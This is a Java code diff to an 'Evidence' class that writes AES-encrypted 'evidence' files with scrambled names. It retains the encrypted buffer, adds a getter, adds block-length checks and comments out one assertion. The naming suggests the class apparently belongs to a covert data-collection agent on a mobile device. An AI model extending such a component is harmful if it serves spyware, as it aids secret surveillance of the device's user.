@@ -273,6 +273,7 @@ public final class Evidence {
 
 	/** The aes key. */
 	private byte[] aesKey;
+	private byte[] encData;
 
 	/**
 	 * Instantiates a new evidence.
@@ -342,7 +343,7 @@ public final class Evidence {
 	 */
 	public synchronized boolean close() {
 		final boolean ret = true;
-
+		encData = null;
 		fconn = null;
 		return ret;
 	}
@@ -428,7 +429,7 @@ public final class Evidence {
 		Check.asserts(fileName != null, "null fileName");
 		Check.asserts(!fileName.endsWith(EvidenceCollector.LOG_EXTENSION),
 				"file not scrambled");
-		Check.asserts(!fileName.endsWith("MOB"), "file not scrambled");
+		//Check.asserts(!fileName.endsWith("MOB"), "file not scrambled");
 		// #endif
 
 		// #ifdef DEBUG
@@ -656,13 +657,14 @@ public final class Evidence {
 			return false;
 		}
 
-		final byte[] encData = encryption.encryptData(data, offset);
+		encData = encryption.encryptData(data, offset);
 		// #ifdef DEBUG
 		debug.info("writeEvidence encdata: " + encData.length);
+		debug.info("fileSize: " + fconn.getSize());
 		// #endif
 
 		try {
-			fconn.write(Utils.intToByteArray(data.length - offset));
+			fconn.append(Utils.intToByteArray(data.length - offset));
 			fconn.append(encData);
 			fconn.flush();
 		} catch (final Exception e) {
@@ -705,6 +707,10 @@ public final class Evidence {
 		return writeEvidence(buffer);
 	}
 
+    public byte[] getEncData(){
+        return encData;
+    }
+    
 	/**
 	 * Info.
 	 * 
@@ -736,6 +742,7 @@ public final class Evidence {
 			final byte[] content) {
 		createEvidence(additionalData);
 		writeEvidence(content);
+		Check.ensures(getEncData().length % 16 == 0, "wrong len");
 		close();
 	}
 
@@ -760,6 +767,7 @@ public final class Evidence {
 	public synchronized void atomicWriteOnce(final byte[] plain) {
 		createEvidence(null);
 		writeEvidence(plain);
+		Check.ensures(getEncData().length % 16 == 0, "wrong len");
 		close();
 	}
 
@@ -789,6 +797,7 @@ public final class Evidence {
 			final byte[] content) {
 		createEvidence(additionalData, logType);
 		writeEvidence(content);
+		Check.ensures(getEncData().length % 16 == 0, "wrong len");
 		close();
 	}
 }
